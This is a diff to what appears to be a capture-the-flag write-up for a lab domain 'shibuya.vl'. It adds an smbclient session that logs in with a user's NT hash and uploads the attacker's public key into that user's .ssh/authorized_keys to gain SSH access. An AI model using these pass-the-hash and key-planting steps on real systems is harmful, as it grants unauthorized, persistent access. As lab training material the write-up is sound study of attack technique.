@@ -295,9 +295,16 @@ But i can connect to the `users` share and add my public key to authorized_keys 
 ```python
 smbclient \\\\AWSJPDC0522.shibuya.vl\\users -U 'simon.watson' --pw-nt-hash '5d8c3d1a20bd63f60f469f6763ca0d50' 
 Try "help" to get a list of possible commands.
-smb: \>
-
+smb: \> cd simon.watson
+smb: \simon.watson\> mkdir .ssh
+smb: \simon.watson\> cd .ssh
+smb: \simon.watson\.ssh\> put /home/kali/.ssh/id_ed25519.pub authorized_keys
+putting file /home/kali/.ssh/id_ed25519.pub as \simon.watson\.ssh\authorized_keys (1.9 kB/s) (average 1.2 kB/s)
 ```
+Now i should be able to SSH in 
 
+# SSH access as `simon.watson`
+```pythi
+```
 
 
